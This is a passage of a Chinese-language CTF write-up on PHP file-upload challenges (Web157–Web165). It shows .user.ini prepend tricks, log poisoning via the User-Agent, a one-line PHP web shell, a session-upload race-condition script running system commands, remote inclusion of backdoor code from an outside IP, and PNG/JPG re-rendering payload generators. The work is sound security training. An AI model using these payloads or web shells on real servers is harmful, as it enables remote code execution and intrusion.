class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># post传参</span></span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ../flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># 源代码拿到flag</span></span><br></pre></td></tr></table></figure><h2 id="Web158"><a href="#Web158" class="headerlink" title="Web158"></a>Web158</h2><p>同web157</p><h2 id="Web159"><a href="#Web159" class="headerlink" title="Web159"></a>Web159</h2><p>老样子先上传.user.ini</p><p>这里过滤了（）</p><p>这里利用include包含日志文件，在日志文件中传马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span> <span class="string">&#x27;var/log/nginx/access.log&#x27;</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 这里对log 进行了过滤</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span> <span class="string">&#x27;var/lo&#x27;</span>.<span class="string">&#x27;g/nginx/access.lo&#x27;</span>.<span class="string">&#x27;g&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过user-agent传入一句话 从而写进日志</p><p><img src="/posts/fdac7c8/image-20220414000750535.png" alt="image-20220414000750535"></p><p>蚁剑连接 xxx.ctf.show&#x2F;upload</p><h2 id="Web160"><a href="#Web160" class="headerlink" title="Web160"></a>Web160</h2><p>老样子先上传.user.ini</p><p>这里过滤了空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里把空格换成0d换行符或者直接去掉空格</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传成功接下来 利用ua传入木马</p><p>蚁剑连接拿到flag</p><h2 id="Web161"><a href="#Web161" class="headerlink" title="Web161"></a>Web161</h2><p>这里对文件内容进行了检测</p><p>在文件中添加文件头GIF98a</p><p><img src="/posts/fdac7c8/image-20220415234148034.png" alt="image-20220415234148034"></p><p><img src="/posts/fdac7c8/image-20220415234205841.png" alt="image-20220415234205841"></p><p>ua传入木马 蚁剑连接拿到flag</p><h2 id="Web162"><a href="#Web162" class="headerlink" title="Web162"></a>Web162</h2><p>这里利用的是session条件竞争</p><p>首先先用161的方法上传.user.ini</p><p>这里对文件内容中的.进行了过滤</p><p>所以要包含一个不含.的文件</p><p><img src="/posts/fdac7c8/image-20220416000207449.png" alt="image-20220416000207449"></p><p>上传txt</p><p><img src="/posts/fdac7c8/image-20220416000325392.png" alt="image-20220416000325392"></p><p>这里用羽师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://266c4d44-1aff-478e-b173-903762efabcb.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://266c4d44-1aff-478e-b173-903762efabcb.challenge.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p>最后跑了半天没做出来<br>最后跑了半天没做出来</p><p>还有一个简单的方法但是需要一台VPS</p><blockquote><p>IP转长地址 <a href="https://www.bejson.com/convert/ip2int/">https://www.bejson.com/convert/ip2int/</a></p></blockquote><p>要在ip地址下的index.html中写入后门代码</p><p>利用远程包含IP转换地址后门调用执行</p><p>.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=png</span><br></pre></td></tr></table></figure><p>png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&#x27;http://1696798202/&#x27;?&gt;</span><br></pre></td></tr></table></figure><h2 id="Web163"><a href="#Web163" class="headerlink" title="Web163"></a>Web163</h2><p>可是使用条件竞争</p><p>也可以使用长地址绕过</p><p>直接在配置文件中包含长地址</p><p>.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=http://1696798202/</span><br></pre></td></tr></table></figure><h2 id="Web164"><a href="#Web164" class="headerlink" title="Web164"></a>Web164</h2><p>这题主要考察png图片的二次渲染</p><p>利用脚本生成一个可以绕过二次渲染的图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>点击查看图片</p><p>使用hackbar</p><p><img src="/posts/fdac7c8/image-20220421152538585.png" alt="image-20220421152538585"></p><p>下载图片到本地用notpad++打开拿到flag</p><h2 id="Web165"><a href="#Web165" class="headerlink" title="Web165"></a>Web165</h2><p>这个题是jpg图片二次渲染绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">用法  php exp.php a.png</span><br></pre></td></tr></table></figure><p>用群主提供的jpg二次渲染专用图片</p><p>先上传一遍 然后下载下来运行脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在linux中运行</span></span><br><span class="line">php exp.php a.jpg</span><br></pre></td></tr></table></figure><p>生成一个payload_a.jpg文件</p><p>再上传</p><p>post 1&#x3D;system(“tac flag.php”)；</p><p>这里用群主的图片试了n多次也没成功又找了一张成功了 